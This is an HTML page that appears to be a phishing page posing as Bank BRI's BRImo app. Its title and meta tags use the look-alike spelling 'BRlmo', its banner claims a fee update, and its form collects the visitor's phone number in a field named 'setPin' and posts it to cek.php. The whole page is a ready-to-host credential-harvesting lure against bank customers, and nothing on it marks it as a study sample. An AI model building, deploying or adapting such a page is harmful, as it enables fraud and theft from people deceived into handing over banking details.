
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ...">
    <meta name="twitter:card" content="summary_large_image" />
    <meta property="og:title" content="BRlmo - Bank BRI" />
    <meta name="twitter:title" content="BRlmo - Bank BRI" />
    <meta property="og:site_name" content="BRImo" />
    <meta name="twitter:site_name" content="BRImo" />
    <meta property="og:description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ..." />
    <meta name="twitter:description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ..." />
    <title>BRImo- Bank BRI</title>
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>

    <!-- Slick CSS -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">

    <!-- Our CSS -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        body {
            font-family: 'Segoe UI',Helvetica,Arial,sans-serif;
            html{overflow-x: hidden;}
        }

        h2 {
            font-family: sans-serif; 
            font-size: 15px; 
            font-weight: bold; 
            color: #0086e0; 
            letter-spacing: 1.2px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }

        h3 {
            font-family: Sans-serif; 
            font-size: 15px; 
            font-weight: bold; 
            color: #000; 
            letter-spacing: 1.5px;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h9 {
            font-family: Sans-serif; 
            font-size: 13px; 
            font-weight: bold;
            text-align: center;
            color: #0086e0; 
            letter-spacing: 1.4px;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h4 {
            font-family: Helvetica; 
            font-size: 16px; 
            font-weight: bold; 
            color: #000; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h5 {
            font-family: Helvetica; 
            font-size: 16px; 
            font-weight: bold; 
            color: #0086e0; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h6 {
            font-family: Helvetica; 
            font-size: 13px; 
            font-weight: bold; 
            color: #000; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }

        .btn-punya {
            display: block;
            margin: 0px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 42px; 
            width: 536px; 
            max-width: 95%;
            font-family: sans-serif; 
            font-size: 16px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px;
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(170, 170, 170) 10px 10px 12px 0px; 
            transition: background 200ms ease 0s;
        }

        .btn-belum {
            display: block;
            margin: 10px auto;
            padding: 0px; 
            cursor: pointer; 
            background: none transparent;
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 536px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 16px; 
            font-weight: bold; 
            color: rgb(0, 134, 224);
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            transition: background 200ms ease 0s;
        }
        
        .form-log {
            box-sizing: border-box; 
            height: 45px; 
            width: 536px; 
            max-width: 100%; 
            border: 3px solid rgb(0, 134, 224); 
            border-image: initial; 
            background-color: rgb(255, 255, 255); 
            border-radius: 8px; 
            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
            font-family: 'Open Sans', sans-serif;
            font-size: 16px; 
            color: rgb(28, 28, 28); 
            word-spacing: 7px; 
            padding: 0px 45px;
        }
        
        #ionIcons {
            color: rgb(22, 119, 199);
            font-size: 29px;
            position: absolute;
            display: block;
            margin-top: 3px;
            margin-left: 15px;
        }
        
        input {
            border: 3px solid rgb(0, 134, 224);
            border-radius: 8px;
            padding: 5px 10px;
        }
        
        h1{
            display: table;
            background: #F8F8FF;
            color: #fff;
            padding: 2px;
            width: 100%;
            
        }
        
        h7{
            display: table;
            background: #3081ce;
            color: #fff;
            padding: 15px;
            width: 100%;
            font-size: 12px;
            text-align: center;
            font-family: sans-serif;
            
        }

        .container {
            max-width: 900px;
            padding: 15px;
            background-color: #fff;
            margin-left: auto;
            margin-right: auto;
        }

        .slider .slick-slide {
            border: solid 0px #000;
        }

        .slider .slick-slide img {
            width: 100%;
            margin-top: 0px;
        }

        /* make button larger and change their positions */
        .slick-prev, .slick-next {
            width: 0px;
            height: 0px;
            z-index: 1;
        }
        .slick-prev {
            left: 0px;
        }
        .slick-next {
            right: 0px;
        }
        .slick-prev:before, 
        .slick-next:before {
            font-size: 0px;
            text-shadow: 0 0 0px rgba(0,0,0,0.5);
        }
        
        /* move dotted nav position */
        .slick-dots {
            bottom: 0px;
        }
        /* enlarge dots and change their colors */
        .slick-dots li button:before {
            font-size: 12px;
            color: #000;
            text-shadow: 0 0 10px rgba(0,0,0,0.5);
            opacity: 0;
        }
        .slick-dots li.slick-active button:before {
            color: #dedede;
        }

        /* transition effects for opacity */
        .slick-arrow,
         {
            transition: opacity 0.2s ease-out;
        }
        
        legend {
            padding: 7px;
            background: #fff;
            color: #3081ce;
        }

    </style>
</head>
<body>
    <h1><img src="img/bri-header.jpg" width="60" style="margin-left: 10px;"></h1>
    <div class="slider">
            <div>
                <a href="#">
                    <img src="img/img-1.jpeg" alt="Image 1">
                </a>            
            </div>
            <div>
                <a href="#">
                    <img src="img/img-2.jpeg" alt="Image 2">
                </a>
            </div>
          </div>
         <div class="container">
        <h2><strong>BANK BRI Update Terbaru Tarif Transaksi</strong></h2>
       <legend>
          <center>
             <img src="img/phone.jpeg" width="200">
            </legend>
           </center>
          <div>
             <br>
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -10px auto;">
                   <div>
                      <form method="post" action="cek.php">
                     <label for="nomor"><h3>Masukan nomor ponsel anda:</h3></label>
         <i class="ion-ios-telephone-outline" id="ionIcons"></i>
        <input name="setPin" type="tel" class="bubble-element Input form-log" minlength="10" placeholder="08XXXXXXXXXX" maxlength="" required><br><br>
       </div>
      <div class="row">
            <button class="btn-punya" type="submit" value="send">Lanjut</button><br><br>
            </div>
          </form>
       <!-- JQuery -->
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <!-- Slick JS -->    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>

    <!-- Our Script -->
    <script>
        $(document).ready(function(){
            $('.slider').slick({
                autoplay: true,
                autoplaySpeed: 500,
                dots: true
            });
        });
    </script>

</body>
</html>